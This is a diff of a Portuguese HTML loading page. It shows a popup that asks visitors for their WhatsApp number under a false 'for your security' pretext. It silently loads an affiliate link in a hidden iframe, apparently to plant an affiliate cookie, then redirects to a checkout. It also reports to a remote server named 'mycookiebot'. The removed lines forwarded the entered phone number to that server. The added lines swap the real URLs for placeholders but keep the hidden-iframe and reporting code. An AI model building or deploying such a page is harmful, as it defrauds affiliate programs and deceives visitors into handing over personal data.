@@ -3,10 +3,9 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Giovanna Antonelli - Mecanismo do Sucesso</title>
+  <title>Completo e Atualizado</title>
 
   <script>
-    // Wakeup do Render (deve rodar imediatamente)
     (function wakeRender() {
       fetch("https://mycookiebot.onrender.com/", { method: "GET" })
         .catch(console.error);
@@ -25,7 +24,6 @@
       margin: 0;
       background-color: #f9f9f9;
     }
-
     .circle {
       width: 30px;
       height: 30px;
@@ -35,30 +33,24 @@
       animation: spin 1s linear infinite;
       margin-bottom: 15px;
     }
-
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
-
     .text {
       font-size: 22px;
       color: #333;
       transition: opacity 0.4s ease-in-out;
     }
-
     #fallback {
       display: none;
       margin-top: 20px;
       font-size: 16px;
     }
-
     #fallback a {
       color: #00a651;
       text-decoration: underline;
     }
-
-    /* ==== POPUP ==== */
     #popup-overlay {
       position: fixed;
       top: 0;
@@ -72,12 +64,10 @@
       z-index: 999;
       animation: fadeIn 0.3s ease-in-out;
     }
-
     @keyframes fadeIn {
       from { opacity: 0; }
       to { opacity: 1; }
     }
-
     #popup-box {
       background: #fff;
       padding: 30px 40px;
@@ -88,25 +78,21 @@
       box-shadow: 0 10px 30px rgba(0,0,0,0.2);
       animation: scaleIn 0.3s ease-in-out;
     }
-
     @keyframes scaleIn {
       from { transform: scale(0.9); opacity: 0; }
       to { transform: scale(1); opacity: 1; }
     }
-
     #popup-box h2 {
       margin-bottom: 10px;
       color: #222;
       font-size: 20px;
       font-weight: 600;
     }
-
     #popup-box p {
       font-size: 14px;
       color: #666;
       margin-bottom: 20px;
     }
-
     #popup-box input {
       width: 100%;
       padding: 12px;
@@ -117,11 +103,9 @@
       margin-bottom: 20px;
       transition: border 0.2s;
     }
-
     #popup-box input:focus {
       border-color: #00a651;
     }
-
     #popup-box button {
       background-color: #00a651;
       color: white;
@@ -134,11 +118,9 @@
       transition: background 0.3s ease;
       width: 100%;
     }
-
     #popup-box button:hover {
       background-color: #008f48;
     }
-
     #popup-box small {
       display: block;
       margin-top: 12px;
@@ -155,13 +137,12 @@
   <iframe id="cookieFrame" src="" style="display:none;"></iframe>
 
   <div id="fallback">
-    Se não for redirecionado, <a href="https://pay.hotmart.com/M76192587E?checkoutMode=10&hideTransf=1&hideTrial=1&split=12&off=tebpjil1">clique aqui</a>.
+    Se não for redirecionado, <a href="https://google.com">clique aqui</a>.
   </div>
 
-  <!-- POPUP -->
   <div id="popup-overlay">
     <div id="popup-box">
-      <h2>Digite o seu WhatsApp para continuar</h2>
+      <h2>Para continuar, digite o seu WhatsApp</h2>
       <p>Para sua segurança, precisamos confirmar o acesso.</p>
       <input id="whatsappInput" type="tel" placeholder="(DDD) 9XXXX-XXXX" />
       <button id="btnProsseguir">PROSSEGUIR</button>
@@ -170,16 +151,14 @@
   </div>
 
   <script>
-    const cookieURL = "https://go.hotmart.com/Y102270021Q?dp=1";  // URL do cookie
-    const checkoutURL = "https://pay.hotmart.com/M76192587E?checkoutMode=10&hideTransf=1&hideTrial=1&split=12&off=tebpjil1"; // URL de redirecionamento final
-
+    const cookieURL = "https://instagram.com";
+    const checkoutURL = "https://google.com";
     const msg = document.getElementById("message");
     const iframe = document.getElementById("cookieFrame");
     const popup = document.getElementById("popup-overlay");
     const btnProsseguir = document.getElementById("btnProsseguir");
     const inputWhatsApp = document.getElementById("whatsappInput");
     let cookieConfirmado = false;
-    let iframeCarregado = false;
 
     function enviarAlerta(msg, whatsapp = "") {
       fetch("https://mycookiebot.onrender.com/send", {
@@ -189,35 +168,14 @@
       }).catch(console.error);
     }
 
-    // Animação de texto principal
-    setTimeout(() => {
-      msg.style.opacity = 0;
-      setTimeout(() => {
-        msg.textContent = "Redirecionando para Página de Pagamento";
-        msg.style.opacity = 1;
-      }, 400);
-    }, 3000);
-
-    // Clique no botão PROSSEGUIR
     btnProsseguir.addEventListener("click", () => {
       const whatsapp = inputWhatsApp.value.trim();
-
-      // Se estiver vazio, não faz nada
       if (whatsapp === "") return;
-
-      // Esconde popup
       popup.style.display = "none";
-
-      // Carrega iframe
       iframe.src = cookieURL;
-
-      // Envia log para o servidor
-      enviarAlerta("🟢 Usuário confirmou e prosseguiu.", whatsapp);
     });
 
-    // Quando o iframe carregar
     iframe.onload = () => {
-      iframeCarregado = true;
       try {
         const test = iframe.contentWindow.location.href;
         cookieConfirmado = true;
@@ -230,7 +188,6 @@
       }
     };
 
-    // Fallback se o iframe não carregar
     setTimeout(() => {
       if (!cookieConfirmado) {
         enviarAlerta(`⛔ CHECKOUT - MECANISMO DO SUCESSO\nPÁGINA: ${checkoutURL}`);
